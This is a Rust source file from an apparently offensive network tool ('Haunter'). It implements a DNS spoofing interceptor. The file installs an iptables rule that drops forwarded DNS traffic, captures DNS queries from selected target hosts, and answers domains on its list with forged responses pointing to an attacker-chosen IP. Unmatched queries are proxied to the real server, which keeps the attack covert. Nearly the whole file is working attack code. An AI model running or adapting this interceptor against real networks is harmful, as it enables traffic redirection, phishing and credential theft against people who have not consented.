use std::net::{Ipv4Addr, UdpSocket};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use pnet::datalink::{MacAddr, NetworkInterface};

use crate::error::{HaunterError, Result};
use crate::net::channel::Channel;
use crate::net::dns::{self, DnsQuery, MAX_FRAME_SIZE};
use crate::net::Device;

const CHANNEL_READ_TIMEOUT: Duration = Duration::from_millis(50);
const PROXY_READ_TIMEOUT: Duration = Duration::from_secs(2);

/// A DNS spoofing rule: queries matching `domain` get `spoof_ip` as the answer.
#[derive(Debug, Clone)]
pub struct DnsRule {
    pub domain: String,
    pub spoof_ip: Ipv4Addr,
}

/// RAII guard that installs an iptables rule to drop forwarded DNS traffic,
/// forcing DNS queries through our interceptor instead of the kernel's
/// IP forwarding path.
pub struct DnsGuard {
    active: bool,
}

impl DnsGuard {
    /// Install the iptables DROP rule for forwarded UDP port 53.
    pub fn install() -> (Self, bool) {
        let status = Command::new("iptables")
            .args(["-I", "FORWARD", "-p", "udp", "--dport", "53", "-j", "DROP"])
            .status();

        let active = match status {
            Ok(s) => s.success(),
            Err(_) => false,
        };

        (Self { active }, active)
    }

    /// Create a guard that does nothing.
    pub fn noop() -> Self {
        Self { active: false }
    }
}

impl Drop for DnsGuard {
    fn drop(&mut self) {
        if self.active {
            let _ = Command::new("iptables")
                .args(["-D", "FORWARD", "-p", "udp", "--dport", "53", "-j", "DROP"])
                .status();
        }
    }
}

/// Run the DNS interceptor loop.
///
/// Captures DNS queries from targets on the wire, spoofs responses for
/// matched domains, and proxies unmatched queries to the real DNS server.
pub fn run(
    iface: &NetworkInterface,
    rules: &[DnsRule],
    our_mac: MacAddr,
    _our_ip: Ipv4Addr,
    targets: &[Device],
    stop: Arc<AtomicBool>,
    log: impl Fn(&str),
) -> Result<()> {
    // Install iptables rule to prevent kernel from forwarding DNS.
    let _dns_guard = {
        let (guard, ok) = DnsGuard::install();
        if ok {
            log("[*] DNS iptables rule installed (FORWARD DROP udp/53).");
        } else {
            log("[!] DNS iptables rule failed — DNS interception may not work.");
        }
        guard
    };

    let mut channel = Channel::open(iface, CHANNEL_READ_TIMEOUT)?;

    // Ephemeral UDP socket for proxying unmatched queries.
    let proxy_socket = UdpSocket::bind("0.0.0.0:0")
        .map_err(|e| HaunterError::Dns(format!("failed to bind proxy socket: {e}")))?;
    proxy_socket
        .set_read_timeout(Some(PROXY_READ_TIMEOUT))
        .map_err(|e| HaunterError::Dns(format!("failed to set read timeout: {e}")))?;

    log(&format!(
        "[*] DNS interceptor started ({} rule(s)).",
        rules.len()
    ));

    let mut buf = [0u8; MAX_FRAME_SIZE];

    while !stop.load(Ordering::Relaxed) {
        let frame = match channel.receive() {
            Ok(Some(data)) => data,
            Ok(None) => continue,
            Err(_) => continue,
        };

        let query = match dns::parse_query(frame) {
            Some(q) => q,
            None => continue,
        };

        // Only intercept queries from our targets.
        if !targets.iter().any(|t| t.ip == query.src_ip) {
            continue;
        }

        // Check if domain matches any rule.
        if let Some(rule) = rules.iter().find(|r| dns::matches_domain(&query.domain, &r.domain)) {
            log(&format!(
                "[*] DNS spoof: {} -> {} (from {})",
                query.domain, rule.spoof_ip, query.src_ip
            ));
            let size = dns::build_response(&mut buf, &query, our_mac, rule.spoof_ip);
            let _ = channel.send(&buf[..size]);
        } else {
            // Proxy to real DNS server.
            match proxy_query(&proxy_socket, &query) {
                Ok(response_payload) => {
                    let size = dns::build_forwarded_response(
                        &mut buf,
                        &query,
                        our_mac,
                        &response_payload,
                    );
                    let _ = channel.send(&buf[..size]);
                }
                Err(_) => {
                    // Silently drop — target will retry.
                }
            }
        }
    }

    log("[*] DNS interceptor stopped.");
    // _dns_guard drops here, removing iptables rule.
    Ok(())
}

/// Forward a DNS query to the real server and return the raw DNS response payload.
fn proxy_query(socket: &UdpSocket, query: &DnsQuery) -> std::result::Result<Vec<u8>, ()> {
    let dst = format!("{}:53", query.dst_ip);
    socket.send_to(&query.dns_payload, &dst).map_err(|_| ())?;

    let mut recv_buf = [0u8; 4096];
    let (n, _) = socket.recv_from(&mut recv_buf).map_err(|_| ())?;
    Ok(recv_buf[..n].to_vec())
}
